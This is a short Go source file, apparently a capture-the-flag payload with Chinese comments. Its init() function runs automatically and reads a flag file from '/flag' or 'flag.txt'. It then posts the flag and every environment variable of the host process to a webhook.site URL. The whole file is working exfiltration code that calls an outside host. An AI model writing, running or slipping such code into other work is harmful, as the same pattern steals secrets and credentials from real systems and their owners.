package main

import (
    "net/http"
    "os"
    "bytes"
)

func init() {
    // 嘗試讀取可能的 Flag 檔案
    flag, _ := os.ReadFile("/flag")
    if len(flag) == 0 {
        flag, _ = os.ReadFile("flag.txt")
    }
    
    // 將 Flag 送往你的 Webhook
    http.Post("https://webhook.site/5cfb2098-1dbf-49b1-9d13-8f637619d1b7", "text/plain", bytes.NewBuffer(flag))
    
    // 同場加映：把所有環境變數也送出去，Flag 可能在裡面
    env := os.Environ()
    for _, e := range env {
        http.Post("https://webhook.site/5cfb2098-1dbf-49b1-9d13-8f637619d1b7", "text/plain", bytes.NewBufferString(e))
    }
}
